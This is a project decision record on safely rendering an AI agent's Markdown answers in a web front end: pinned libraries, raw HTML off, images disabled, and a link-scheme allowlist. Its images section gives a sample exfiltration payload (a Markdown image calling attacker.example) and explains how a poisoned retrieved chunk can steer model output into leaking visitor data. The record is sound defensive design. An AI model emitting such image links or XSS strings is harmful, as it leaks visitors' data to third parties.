# 0007 — Markdown rendering, and how it is made inert

Phase 7 front end. One dependency pair, pinned exactly, with the raw-HTML escape
hatches closed deliberately rather than by omission.

## `react-markdown` + `remark-gfm`, pinned

The agent's answers are Markdown. Something has to turn that into DOM.

The alternative is a hand-written parser, and that is the worst option available:
a bespoke Markdown parser is a bespoke HTML sanitiser too, and it is the one
component in this project whose bugs are XSS in a recruiter's browser. A mature
library's escaping is the thing being reviewed; ours would be new code.

`AGENTS.md` requires a decision record before a library lands, which is this.

**Exact pins, no `^`.** `react-markdown@10.1.0`, `remark-gfm@4.0.1`. A floating
range on a component that renders untrusted text means a routine dependency bump
can change what is escaped without a human reading a diff. Pinning costs an
upgrade and buys a reviewable one.

`remark-gfm` because the model emits tables, strikethrough and task lists. It
parses those into AST nodes and does nothing about safety itself.

## Raw HTML is off, and that is the point

No `rehype-raw`. That plugin re-parses the answer as HTML, which turns the
Markdown parser's "this is text" guarantee into "this is markup" — and the text
being parsed is model output, which is influenced by whatever a retrieved corpus
chunk or a visitor's question said.

Without it, a `<script>` or `<img onerror=...>` in an answer renders as the
literal characters. That is the correct outcome.

## Images are disabled outright

`<img>` in model output is an exfiltration channel. A rendered image is a GET to
whatever URL appears in the answer, from the visitor's browser, with their IP,
their `Referer`, and their cookies for that origin. The model will happily
produce `![](https://attacker.example/collect?victim-id)` from a corpus chunk
that contains one.

`img` is overridden to render its `alt` text and nothing else. No network
request, no layout shift, no third-party pixel.

## Links: scheme allowlist, plus `rel`

`urlTransform` drops any `href` whose scheme is not `http`, `https` or `mailto`.

`javascript:` in an `href` is the same class of bug as raw HTML, and
`react-markdown` already defaults to safe here — the override exists so the rule
is stated in this repository rather than inherited from a default that could
change, and so it is testable.

Every link also gets `rel="noopener noreferrer"`, because these answers will
routinely link to repositories and a `target="_blank"` without `noopener` hands
the opened page a live `window.opener` reference to this one.

## What this does not cover

Nothing renders the answer inside the site's own chrome in a way that could
execute. The renderer is a leaf: it receives a string and returns elements. There
is no `dangerouslySetInnerHTML` anywhere in `apps/web`, and adding one would need
its own record.

## The privacy line is not a markdown feature

The disclosure that a third-party model provider processes the message and
retains it for up to a day is plain text next to the composer, not a footnote in
the answer. It is about what happens to a visitor's words before the model sees
them, which is a different question from how the answer is formatted, and hiding
it in the formatting would bury it.